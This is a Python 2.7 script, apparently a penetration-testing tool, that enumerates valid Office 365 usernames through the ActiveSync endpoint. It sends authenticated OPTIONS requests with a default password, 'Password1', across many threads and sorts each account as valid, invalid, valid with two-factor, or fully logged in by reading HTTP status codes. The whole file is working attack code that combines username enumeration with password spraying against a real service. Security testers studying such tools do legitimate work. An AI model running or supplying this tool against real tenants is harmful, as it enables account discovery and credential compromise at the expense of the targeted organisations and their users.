#! /usr/bin/env python2.7
'''
.       .1111...          | Title: office365userenum.py
    .10000000000011.   .. | Author: Oliver Morton (Sec-1 Ltd)
 .00              000...  | Email: oliverm@sec-1.com
1                  01..   | Description:
                    ..    | Enumerate valid usernames from Office 365 using
                   ..     | ActiveSync.
GrimHacker        ..      | Requires: Python 2.7, python-requests
                 ..       |
grimhacker.com  ..        |
@grimhacker    ..         |
----------------------------------------------------------------------------
office365userenum - Office 365 Username Enumerator
    Copyright (C) 2015  Oliver Morton (Sec-1 Ltd)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License along
    with this program; if not, write to the Free Software Foundation, Inc.,
    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
'''

__version__ = "$Revision: 1.1$"
# $Source$

import argparse
import requests
import threading
import Queue
from time import sleep

VALID_USER = "VALID_USER"
INVALID_USER = "INVALID_USER"
VALID_PASSWD_2FA = "VALID_PASSWD_2FA"
VALID_LOGIN = "VALID_LOGIN"
UNKNOWN = "UNKNOWN"
DIE = "!!!AVADA KEDAVRA!!!"
SHUTDOWN_EVENT = threading.Event()

def check_user(url, user, password):
    headers = {}
    headers["MS-ASProtocolVersion"] = "14.0"
    auth = (user, password)
    try:
        r = requests.options(url, headers=headers, auth=auth, timeout=TIMEOUT)
    except Exception as e:
        print "error checking {} : {}".format(user, e)
        return user, UNKNOWN, None
    status = r.status_code
    if status == 401:
        return user, VALID_USER, r
    elif status == 404:
        if r.headers.get("X-CasErrorCode") == "UserNotFound":
            return user, INVALID_USER, r
    elif status == 403:
        return user, VALID_PASSWD_2FA, r
    elif status == 200:
        return user, VALID_LOGIN, r
    return user, UNKNOWN, r

def check_users(in_q, out_q, url, password):
    while not SHUTDOWN_EVENT.is_set():
        try:
            user = in_q.get()
        except Queue.Empty as e:
            #print "in_q empty"
            continue
        if user == DIE:
            in_q.task_done()
            #print "check_users thread dying"
            break
        else:
            #print "checking: {}".format(user)
            try:
                result = check_user(url, user, password)
            except Exception as e:
                print "Error checking {} : {}".format(user, e)
                in_q.task_done()
                continue
            #print result
            out_q.put(result)
            in_q.task_done()


def get_users(user_file, in_q):
    with open(user_file, "r") as f:
        for line in f:
            if SHUTDOWN_EVENT.is_set():
                break
            user = line.strip()
            #print "user = {}".format(user)
            in_q.put(user)
    for _ in range(MAX_THREADS):
        in_q.put(DIE)

def report(out_q, output_file):
    template = "[{s}] {code} {valid} {user}:{password}"
    symbols = {VALID_USER: "+",
            INVALID_USER: "-",
            VALID_PASSWD_2FA: "#",
            VALID_LOGIN: "!",
            UNKNOWN: "?"}
    
    with open(output_file, "a", 1) as f:
        while not SHUTDOWN_EVENT.is_set():
            try:
                result = out_q.get()
            except Queue.Empty as e:
                #print "out_q empty"
                continue
            if result == DIE:
                out_q.task_done()
                #print "report thread dying."
                break 
            else:
                user, valid, r = result
                if r is None:
                    code = "???"
                else:
                    code = r.status_code
                s = symbols.get(valid)
                output = template.format(s=s, code=code, valid=valid, user=user, password=password)
                print output
                f.write("{}\n".format(output))
                out_q.task_done()

def print_version():
    """Print command line version banner."""
    print """

.       .1111...          | Title: office365userenum.py
    .10000000000011.   .. | Author: Oliver Morton (Sec-1 Ltd)
 .00              000...  | Email: oliverm@sec-1.com
1                  01..   | Description:
                    ..    | Enumerate valid usernames from Office 365 using
                   ..     | ActiveSync.
GrimHacker        ..      | Requires Python 2.7
                 ..       |
grimhacker.com  ..        |
@grimhacker    ..         |
----------------------------------------------------------------------------
    This program comes with ABSOLUTELY NO WARRANTY.
    This is free software, and you are welcome to redistribute it
    under certain conditions. See GPLv2 License.
----------------------------------------------------------------------------
""".format(__version__)


if __name__ == "__main__":
    print_version()

    default_password = "Password1"
    default_url = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
    default_max_threads = 10
    default_timeout = 30
    
    parser = argparse.ArgumentParser(description="Enumerate Usernames from Office365 ActiveSync")
    parser.add_argument("-u", "--users", help="Potential usernames file, one username per line", required=True)
    parser.add_argument("-o", "--output", help="Output file (will be appended to)", required=True)
    parser.add_argument("--password", help="Password to use during enumeration. Default: {}".format(default_password), default=default_password)
    parser.add_argument("--url", help="ActiveSync URL. Default: {}".format(default_url), default=default_url)
    parser.add_argument("--threads", help="Maximum threads. Default: {}".format(default_max_threads), default=default_max_threads, type=int)
    parser.add_argument("--timeout", help="HTTP Timeout. Default: {}".format(default_timeout), default=default_timeout, type=float)

    args = parser.parse_args()
    
    user_file = args.users
    output_file = args.output
    url = args.url
    password = args.password
    MAX_THREADS = args.threads
    TIMEOUT = args.timeout

    threads = []
    meta_threads = []
    max_size = MAX_THREADS/2
    if max_size < 1:
        max_size = 1
    in_q = Queue.Queue(maxsize=max_size)
    out_q = Queue.Queue(maxsize=max_size)

    try:
        report_thread = threading.Thread(name="Thread-report", target=report, args=(out_q, output_file))
        report_thread.start()
        meta_threads.append(report_thread)

        file_thread = threading.Thread(name="Thread-inputfile", target=get_users, args=(user_file, in_q))
        file_thread.start()
        meta_threads.append(file_thread)

        for num in range(MAX_THREADS):
            t = threading.Thread(name="Thread-worker{}".format(num), target=check_users, args=(in_q, out_q, url, password))
            t.start()
            threads.append(t)
       
        for thread in threads:
            while thread.is_alive():
                thread.join(timeout=0.1)
        out_q.put(DIE)
        for thread in meta_threads:
            while thread.is_alive():
                thread.join(timeout=0.1)
    
    except KeyboardInterrupt as e:
        print "Received KeyboardInterrupt - shutting down"
        SHUTDOWN_EVENT.set()

        for thread in threads:
            while thread.is_alive():
                thread.join(timeout=0.1)
        out_q.put(DIE)
        for thread in meta_threads:
            while thread.is_alive():
                thread.join(timeout=0.1)

